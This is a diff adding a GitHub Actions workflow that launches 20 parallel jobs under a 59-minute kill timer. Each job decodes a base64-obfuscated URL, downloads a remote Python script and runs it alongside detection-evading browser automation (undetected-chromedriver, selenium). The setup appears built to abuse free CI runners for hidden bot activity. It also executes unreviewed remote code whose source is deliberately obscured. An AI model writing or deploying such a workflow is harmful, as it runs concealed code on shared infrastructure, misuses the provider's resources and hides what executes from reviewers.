@@ -1,0 +1,103 @@
+name: Azure Phantom Relay Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: phantom-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # -----------------------------------------------------------------
+  # Watchtower: sleeps for 59 minutes, then stops the whole run
+  # -----------------------------------------------------------------
+  watchtower-keeper:
+    name: "Watchtower Keeper"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      HOLD_WINDOW: 3540
+    steps:
+      - name: Arm Watchtower
+        run: |
+          echo "[WATCHTOWER] Arming watchtower for run: ${{ github.run_id }}"
+          echo "[WATCHTOWER] Hold window set to ${HOLD_WINDOW} seconds (59-minute mark)."
+
+          sleep "${HOLD_WINDOW}"
+
+          echo "[WATCHTOWER] Mark reached — issuing stop signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHTOWER] Stop signal sent. Active and pending tasks will be halted."
+
+  # -----------------------------------------------------------------
+  # Relay grid: parallel node execution
+  # -----------------------------------------------------------------
+  relay-grid:
+    name: "Relay-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: [k7a1, m3b9, q8c2, t5d4, z1e7, r9f3, w2g8, n6h5, y4j1, p8k6, v3l9, x7m2, c5n4, b2p7, s9q3, d6r8, f1t5, g8u2, h4v6, l7w3]
+
+    steps:
+      # ---------------------------------------------------------------
+      # Phase 1: Prepare the node
+      # ---------------------------------------------------------------
+      - name: Bootstrap Environment
+        run: |
+          echo "[BOOTSTRAP] Preparing Relay-${{ matrix.node_tag }} on Ubuntu..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ---------------------------------------------------------------
+      # Phase 2: Retrieve the core script
+      # ---------------------------------------------------------------
+      - name: Fetch Core Script
+        run: |
+          echo "[FETCH] Retrieving core script from remote location..."
+          SRC_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$SRC_URL" -o phantom_core.py
+          echo "[FETCH] Core script stored locally."
+
+      # ---------------------------------------------------------------
+      # Phase 3: Add runtime dependencies
+      # ---------------------------------------------------------------
+      - name: Add Dependencies
+        run: |
+          echo "[DEPS] Adding runtime dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ---------------------------------------------------------------
+      # Phase 4: Start the core process (59-minute ceiling)
+      # ---------------------------------------------------------------
+      - name: Start Core Process
+        run: |
+          echo ">> Starting core process for Relay-${{ matrix.node_tag }}..."
+
+          python3 phantom_core.py &
+          CORE_PID=$!
+
+          echo ">> Process started. Runtime ceiling: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$CORE_PID" 2>/dev/null; then
+            echo ">> Ceiling reached — stopping the process."
+            kill -9 "$CORE_PID"
+            echo ">> Process halted by the runtime controller."
+          else
+            echo ">> Process finished ahead of the ceiling."
+          fi
